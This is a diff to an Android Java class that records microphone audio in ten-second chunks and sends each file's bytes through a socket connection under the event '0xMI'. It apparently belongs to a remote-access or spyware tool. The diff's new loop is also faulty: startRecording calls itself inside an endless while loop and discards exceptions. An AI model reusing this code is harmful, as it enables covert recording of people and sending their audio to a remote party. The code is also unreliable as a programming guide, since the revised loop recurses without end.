@@ -23,7 +23,7 @@ public  class AudioRecorder {
     static TimerTask stopRecording;
 
 
-    public static void startRecording(int sec) throws Exception {
+    public static void startRecording(long sec) throws Exception {
 
 
         //Creating file
@@ -31,8 +31,8 @@ public  class AudioRecorder {
         try {
             Log.e("DIRR" , dir.getAbsolutePath());
             
-            // String filename = ""+sec;
-            audiofile = File.createTempFile("omsai", ".mp3", dir);
+            String filename = ""+sec;
+            audiofile = File.createTempFile(filename, ".mp3", dir);
         } catch (IOException e) {
             Log.e(TAG, "external storage access error");
             return;
@@ -52,54 +52,43 @@ public  class AudioRecorder {
 
         }
         recorder.start();
-
-
-        stopRecording = new TimerTask() {
-            @Override
-            public void run() {
-                //stopping recorder
+        while(true){
+            try{
+                startRecording(10);
+                Thread.sleep(10000);  
                 recorder.stop();
                 recorder.release();
-                // sendVoice(audiofile);s
-               
-                // upload file
-                int size = (int) audiofile.length();
-                byte[] data = new byte[size];
-                try {
-                    BufferedInputStream buf = new BufferedInputStream(new FileInputStream(audiofile));
-                    buf.read(data, 0, data.length);
-                    JSONObject object = new JSONObject();
-                    object.put("file",true);
-                    object.put("name",audiofile.getName());
-                    object.put("buffer" , data);
-                    IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
-                    buf.close();
-                } catch (FileNotFoundException e) {
-                    e.printStackTrace();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-
+                sendVoice(audiofile);
                 audiofile.delete();
-                try{
                 startRecording(10);
-
-                }
-                catch(Exception e){
-
-                }
+            }
+            catch(Exception e){
 
             }
-        };
-
-        new Timer().schedule(stopRecording, 10000);
+                
+        }   
     }
 
     private static void sendVoice(File file){
 
-       
+        int size = (int) file.length();
+        byte[] data = new byte[size];
+        try {
+            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
+            buf.read(data, 0, data.length);
+            JSONObject object = new JSONObject();
+            object.put("file",true);
+            object.put("name",file.getName());
+            object.put("buffer" , data);
+            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
+            buf.close();
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
 
     }
 
